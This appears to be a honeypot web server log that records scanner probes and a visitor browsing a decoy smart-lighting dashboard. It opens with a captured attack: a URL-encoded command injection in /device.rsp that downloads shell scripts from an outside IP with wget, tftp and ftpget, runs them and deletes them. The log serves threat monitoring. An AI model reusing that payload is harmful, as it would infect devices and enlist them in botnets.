+2025-06-30 06:06:00 INFO:snare.server:handle_request: Request path: /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F207.167.64.24%2Ftbk.sh%3B%20chmod%20777%20tbk.sh%3B%20sh%20tbk.sh%3B%20tftp%20207.167.64.24%20-c%20get%20tbk1.sh%3B%20chmod%20777%20tbk1.sh%3B%20sh%20tbk1.sh%3B%20tftp%20-r%20tbk2.sh%20-g%20207.167.64.24%3B%20chmod%20777%20tbk2.sh%3B%20sh%20tbk2.sh%3B%20ftpget%20-v%20-u%20anonymous%20-p%20anonymous%20-P%2021%20207.167.64.24%20tbk1.sh%20tbk1.sh%3B%20sh%20tbk1.sh%3B%20rm%20-rf%20tbk.sh%20tbk1.sh%20tbk2.sh%20tbk1.sh
+2025-06-30 06:06:00 INFO:snare.server:handle_request: POST data:
+2025-06-30 06:06:00 INFO:aiohttp.access:log: 64.130.33.147 [30/Jun/2025:06:06:00 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F207.167.64.24%2Ftbk.sh%3B%20chmod%20777%20tbk.sh%3B%20sh%20tbk.sh%3B%20tftp%20207.167.64.24%20-c%20get%20tbk1.sh%3B%20chmod%20777%20tbk1.sh%3B%20sh%20tbk1.sh%3B%20tftp%20-r%20tbk2.sh%20-g%20207.167.64.24%3B%20chmod%20777%20tbk2.sh%3B%20sh%20tbk2.sh%3B%20ftpget%20-v%20-u%20anonymous%20-p%20anonymous%20-P%2021%20207.167.64.24%20tbk1.sh%20tbk1.sh%3B%20sh%20tbk1.sh%3B%20rm%20-rf%20tbk.sh%20tbk1.sh%20tbk2.sh%20tbk1.sh HTTP/1.1" 404 433 "-" "Mozila/5.0"
+2025-06-30 06:17:22 INFO:snare.server:handle_request: Request path: /.git/HEAD
+2025-06-30 06:17:22 INFO:aiohttp.access:log: 198.55.98.76 [30/Jun/2025:06:17:22 +0000] "GET /.git/HEAD HTTP/1.1" 404 452 "-" "Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre"
+2025-06-30 06:33:40 INFO:snare.server:handle_request: Request path: /
+2025-06-30 06:33:40 INFO:aiohttp.access:log: 198.235.24.158 [30/Jun/2025:06:33:40 +0000] "GET / HTTP/1.1" 200 2033 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
+2025-06-30 07:12:57 INFO:snare.server:handle_request: Request path: /
+2025-06-30 07:12:57 INFO:aiohttp.access:log: 52.225.90.246 [30/Jun/2025:07:12:57 +0000] "GET / HTTP/1.1" 200 2033 "-" "mrtscan/1.0 (westus)"
+2025-06-30 07:12:57 INFO:snare.server:handle_request: Request path: /
+2025-06-30 07:12:57 INFO:aiohttp.access:log: 52.225.90.246 [30/Jun/2025:07:12:57 +0000] "GET / HTTP/1.1" 200 2033 "-" "mrtscan/1.0 (westus)"
+2025-06-30 07:12:57 INFO:aiohttp.access:log: 52.225.90.246 [30/Jun/2025:07:12:57 +0000] "UNKNOWN / HTTP/1.0" 400 222 "-" "-"
+2025-06-30 07:22:41 INFO:snare.server:handle_request: Request path: /cgi-bin/luci/;stok=/locale
+2025-06-30 07:22:41 INFO:aiohttp.access:log: 64.130.33.147 [30/Jun/2025:07:22:41 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 433 "-" "-"
+2025-06-30 07:26:08 INFO:aiohttp.access:log: 205.210.31.23 [30/Jun/2025:07:26:08 +0000] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
+2025-06-30 07:26:08 INFO:aiohttp.access:log: 205.210.31.23 [30/Jun/2025:07:26:08 +0000] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
+2025-06-30 07:50:46 INFO:aiohttp.access:log: 118.26.37.105 [30/Jun/2025:07:50:46 +0000] "UNKNOWN / HTTP/1.0" 400 225 "-" "-"
+2025-06-30 07:50:57 INFO:snare.server:handle_request: Request path: /
+2025-06-30 07:50:57 INFO:aiohttp.access:log: 118.26.37.105 [30/Jun/2025:07:50:57 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
+2025-06-30 07:51:15 INFO:snare.server:handle_request: Request path: /favicon.ico
+2025-06-30 07:51:15 INFO:aiohttp.access:log: 118.26.37.105 [30/Jun/2025:07:51:15 +0000] "GET /favicon.ico HTTP/1.1" 404 433 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
+2025-06-30 07:51:16 INFO:snare.server:handle_request: Request path: /robots.txt
+2025-06-30 07:51:16 INFO:aiohttp.access:log: 118.26.37.105 [30/Jun/2025:07:51:16 +0000] "GET /robots.txt HTTP/1.1" 404 433 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
+2025-06-30 07:51:16 INFO:snare.server:handle_request: Request path: /sitemap.xml
+2025-06-30 07:51:16 INFO:aiohttp.access:log: 118.26.37.105 [30/Jun/2025:07:51:16 +0000] "GET /sitemap.xml HTTP/1.1" 404 433 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
+2025-06-30 07:51:17 INFO:snare.server:handle_request: Request path: /assets/js/auth.js
+2025-06-30 07:51:17 INFO:aiohttp.access:log: 118.26.37.105 [30/Jun/2025:07:51:17 +0000] "GET /assets/js/auth.js HTTP/1.1" 200 399 "-" "Go-http-client/1.1"
+2025-06-30 07:51:17 INFO:snare.server:handle_request: Request path: /config.json
+2025-06-30 07:51:17 INFO:aiohttp.access:log: 118.26.37.105 [30/Jun/2025:07:51:17 +0000] "GET /config.json HTTP/1.1" 404 433 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
+2025-06-30 07:53:38 INFO:aiohttp.access:log: 184.105.247.254 [30/Jun/2025:07:53:38 +0000] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
+2025-06-30 07:54:37 INFO:snare.server:handle_request: Request path: /
+2025-06-30 07:54:37 INFO:aiohttp.access:log: 185.218.84.45 [30/Jun/2025:07:54:37 +0000] "GET / HTTP/1.1" 200 2033 "-" "-"
+2025-06-30 07:59:03 INFO:snare.server:handle_request: Request path: /
+2025-06-30 07:59:03 INFO:aiohttp.access:log: 185.218.84.47 [30/Jun/2025:07:59:03 +0000] "GET / HTTP/1.1" 200 2033 "-" "-"
+2025-06-30 08:11:58 INFO:snare.server:handle_request: Request path: /
+2025-06-30 08:11:58 INFO:aiohttp.access:log: 35.216.171.97 [30/Jun/2025:08:11:58 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0"
+2025-06-30 08:37:36 INFO:snare.server:handle_request: Request path: /.git/config
+2025-06-30 08:37:36 INFO:aiohttp.access:log: 146.70.116.139 [30/Jun/2025:08:37:36 +0000] "GET /.git/config HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; Scanner/1.0)"
+2025-06-30 08:57:38 INFO:snare.server:handle_request: Request path: /
+2025-06-30 08:57:38 INFO:aiohttp.access:log: 185.218.84.178 [30/Jun/2025:08:57:38 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+2025-06-30 09:22:44 INFO:snare.server:handle_request: Request path: /
+2025-06-30 09:22:44 INFO:aiohttp.access:log: 80.82.77.202 [30/Jun/2025:09:22:44 +0000] "GET / HTTP/1.0" 200 2033 "-" "Mozilla/5.0 (Linux; Android 4.4.2; LGMS323 Build/KOT49I.MS32310b) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.103 Mobile Safari/537.36"
+2025-06-30 09:31:14 INFO:snare.server:handle_request: Request path: /
+2025-06-30 09:31:14 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:31:14 +0000] "GET / HTTP/1.1" 200 2033 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-30 09:31:14 INFO:snare.server:handle_request: Request path: /login.css
+2025-06-30 09:31:14 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:31:14 +0000] "GET /login.css HTTP/1.1" 200 1811 "http://20.123.44.15/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-30 09:31:14 INFO:snare.server:handle_request: Request path: /assets/js/auth.js
+2025-06-30 09:31:14 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:31:14 +0000] "GET /assets/js/auth.js HTTP/1.1" 200 339 "http://20.123.44.15/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-30 09:31:15 INFO:snare.server:handle_request: Request path: /favicon.ico
+2025-06-30 09:31:15 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:31:15 +0000] "GET /favicon.ico HTTP/1.1" 404 433 "http://20.123.44.15/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-30 09:31:20 INFO:snare.server:handle_request: Request path: /dashboard.html
+2025-06-30 09:31:20 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:31:20 +0000] "GET /dashboard.html HTTP/1.1" 200 2853 "http://20.123.44.15/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-30 09:31:20 INFO:snare.server:handle_request: Request path: /assets/css/fontawesome.css
+2025-06-30 09:31:20 INFO:snare.server:handle_request: Request path: /vendor/bootstrap/css/bootstrap.min.css
+2025-06-30 09:31:20 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:31:20 +0000] "GET /assets/css/fontawesome.css HTTP/1.1" 200 123364 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-30 09:31:20 INFO:snare.server:handle_request: Request path: /assets/css/style.css
+2025-06-30 09:31:20 INFO:snare.server:handle_request: Request path: /vendor/bootstrap/js/bootstrap.min.js
+2025-06-30 09:31:20 INFO:snare.server:handle_request: Request path: /assets/js/custom.js
+2025-06-30 09:31:20 INFO:snare.server:handle_request: Request path: /vendor/jquery/jquery.min.js
+2025-06-30 09:31:20 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:31:20 +0000] "GET /assets/css/style.css HTTP/1.1" 200 35951 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-30 09:31:20 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:31:20 +0000] "GET /vendor/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 60754 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-30 09:31:20 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:31:20 +0000] "GET /vendor/jquery/jquery.min.js HTTP/1.1" 200 87121 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-30 09:31:20 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:31:20 +0000] "GET /assets/js/custom.js HTTP/1.1" 200 6474 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-30 09:31:20 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:31:20 +0000] "GET /vendor/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 220973 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-30 09:31:20 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-30 09:31:20 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:31:20 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-30 09:31:20 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-30 09:31:20 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:31:20 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-30 09:31:20 INFO:snare.server:handle_request: Request path: /assets/images/logo.png
+2025-06-30 09:31:20 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:31:20 +0000] "GET /assets/images/logo.png HTTP/1.1" 200 427 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-30 09:31:23 INFO:snare.server:handle_request: Request path: /lighting.html
+2025-06-30 09:31:23 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:31:23 +0000] "GET /lighting.html HTTP/1.1" 200 4859 "http://20.123.44.15/dashboard.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-30 09:31:23 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-30 09:31:23 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:31:23 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-30 09:31:23 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-30 09:31:23 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:31:23 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36"
+2025-06-30 09:32:14 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-30 09:32:14 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:32:14 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:32:14 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-30 09:32:14 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.woff2
+2025-06-30 09:32:14 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-regular-400.ttf
+2025-06-30 09:32:14 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:32:14 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:32:14 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:32:14 +0000] "GET /assets/webfonts/fa-regular-400.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:32:14 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:32:14 +0000] "GET /assets/webfonts/fa-regular-400.ttf HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
+2025-06-30 09:32:20 INFO:snare.server:handle_request: Request path: /apple-touch-icon-precomposed.png
+2025-06-30 09:32:20 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:32:20 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 433 "-" "com.apple.WebKit.Networking/20621.2.5.11.8 Network/4277.121.5 macOS/15.5"
+2025-06-30 09:32:20 INFO:snare.server:handle_request: Request path: /favicon.ico
+2025-06-30 09:32:20 INFO:snare.server:handle_request: Request path: /apple-touch-icon.png
+2025-06-30 09:32:20 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:32:20 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 433 "-" "com.apple.WebKit.Networking/20621.2.5.11.8 Network/4277.121.5 macOS/15.5"
+2025-06-30 09:32:20 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:32:20 +0000] "GET /favicon.ico HTTP/1.1" 404 433 "-" "com.apple.WebKit.Networking/20621.2.5.11.8 Network/4277.121.5 macOS/15.5"
+2025-06-30 09:32:38 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-30 09:32:38 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:32:38 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:32:38 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-30 09:32:38 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:32:38 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:32:38 INFO:snare.server:handle_request: Request path: /favicon.ico
+2025-06-30 09:32:38 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:32:38 +0000] "GET /favicon.ico HTTP/1.1" 404 433 "http://20.123.44.15/lighting.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:26 INFO:snare.server:handle_request: Request path: /lighting.html
+2025-06-30 09:33:26 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:26 +0000] "GET /lighting.html HTTP/1.1" 200 4919 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:26 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-30 09:33:26 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:26 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:26 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-30 09:33:26 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:26 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:26 INFO:snare.server:handle_request: Request path: /lighting.html
+2025-06-30 09:33:26 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:26 +0000] "GET /lighting.html HTTP/1.1" 200 4859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:26 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-30 09:33:26 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:26 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:26 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-30 09:33:26 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:26 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:27 INFO:snare.server:handle_request: Request path: /lighting.html
+2025-06-30 09:33:27 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:27 +0000] "GET /lighting.html HTTP/1.1" 200 4859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:27 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-30 09:33:27 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:27 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:27 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-30 09:33:27 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:27 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:27 INFO:snare.server:handle_request: Request path: /lighting.html
+2025-06-30 09:33:27 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:27 +0000] "GET /lighting.html HTTP/1.1" 200 4859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:27 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-30 09:33:27 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:27 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:27 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-30 09:33:27 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:27 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:27 INFO:snare.server:handle_request: Request path: /lighting.html
+2025-06-30 09:33:27 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:27 +0000] "GET /lighting.html HTTP/1.1" 200 4859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:27 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-30 09:33:27 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:27 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:27 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-30 09:33:27 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:27 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:27 INFO:snare.server:handle_request: Request path: /lighting.html
+2025-06-30 09:33:27 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:27 +0000] "GET /lighting.html HTTP/1.1" 200 4859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:27 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
+2025-06-30 09:33:27 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:27 +0000] "GET /assets/webfonts/fa-solid-900.woff2 HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:28 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.ttf
+2025-06-30 09:33:28 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:28 +0000] "GET /assets/webfonts/fa-solid-900.ttf HTTP/1.1" 404 433 "http://20.123.44.15/assets/css/fontawesome.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:28 INFO:snare.server:handle_request: Request path: /lighting.html
+2025-06-30 09:33:28 INFO:aiohttp.access:log: 217.71.1.44 [30/Jun/2025:09:33:28 +0000] "GET /lighting.html HTTP/1.1" 200 4859 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+2025-06-30 09:33:28 INFO:snare.server:handle_request: Request path: /assets/webfonts/fa-solid-900.woff2
